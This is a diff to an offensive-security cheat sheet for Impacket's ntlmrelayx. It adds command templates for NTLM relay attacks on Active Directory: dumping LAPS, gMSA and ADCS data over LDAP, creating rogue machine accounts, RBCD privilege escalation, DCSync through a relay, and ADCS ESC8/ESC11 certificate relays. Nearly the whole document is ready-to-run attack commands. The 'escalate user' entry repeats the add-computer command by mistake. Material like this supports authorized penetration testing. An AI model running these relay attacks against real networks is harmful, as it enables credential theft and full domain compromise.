@@ -1,12 +1,45 @@
 # ntlmrelayx (imp)
 
-% impacket-mitm, windows, smb, 445
+% impacket-mitm, windows, ntlm
 
 #plateform/linux  #target/remote #cat/ATTACK/RELAY
-## add computer
+
+
+## ldap - dump all
+```bash
+ntlmrelayx -t ldap://<dc_ip> -smb2support --no-da --no-acl --dump-adcs --dump-laps --dump-gmsa --lootdir <ldap_dump_dir|ldap_dump> 
 ```
-ntlmrelayx -t ldaps://<dc1> -smb2support --remove-mic --add-computer <computer_name> <computer_password> --delegate-access
+
+## ldap - add computer
+```bash
+ntlmrelayx -t ldap://<dc_ip> -smb2support --no-dump --add-computer <computer_name|jubeaz> '<computer_password|Zaebuj123456+->'
 ```
+
+## ldap - escalate user
+```bash
+ntlmrelayx -t ldap://<dc_ip> -smb2support --no-dump --add-computer <computer_name|jubeaz> '<computer_password|Zaebuj123456+->'
+```
+
+## ldap - escalate user (RBCD)
+```bash
+ntlmrelayx -t ldap://<dc_ip> -smb2support --no-dump --escalate-user  '<user>' -delegate-access
+```
+
+## ldap - escalate computer (RBCD)
+```bash
+ntlmrelayx -t ldap://<dc_ip> -smb2support --no-dump --escalate-user  '<computer>$' -delegate-access
+```
+
+## dcsync - if zerologon vuln
+```bash
+ntlmrelayx -t dcsync://<dc_ip> -smb2support
+```
+
+## dcsync - if zerologon vuln (creds )
+```bash
+ntlmrelayx -t dcsync://<dc_ip> -smb2support -auth-smb <domain_fqdn>/<user>:'<password>'
+```
+
 ## host a payload that will automatically be served to the remote host connecting
 #plateform/linux #target/serve #cat/ATTACK/MITM 
 
@@ -49,13 +82,13 @@ ntlmrelayx.py -t ldaps://<dc_ip> -wh <attacker_ip> --delegate-access
 ```
 
 
-## ADCS relay attack ESC8
+## ADCS - relay attack ESC8
 #plateform/linux #target/serve #cat/ATTACK/MITM 
 ```
 ntlmrelayx.py -t http://<ca_ip>/certsrv/certfnsh.asp -smb2support --adcs --template <template>
 ```
 
-## ADCS relay attack ESC11
+## ADCS - relay attack ESC11
 #plateform/linux #target/serve #cat/ATTACK/MITM 
 ```
 ntlmrelayx.py -t rpc://<ca_ip> -rpc-mode ICPR -icpr-ca-name <ca_name> -smb2support
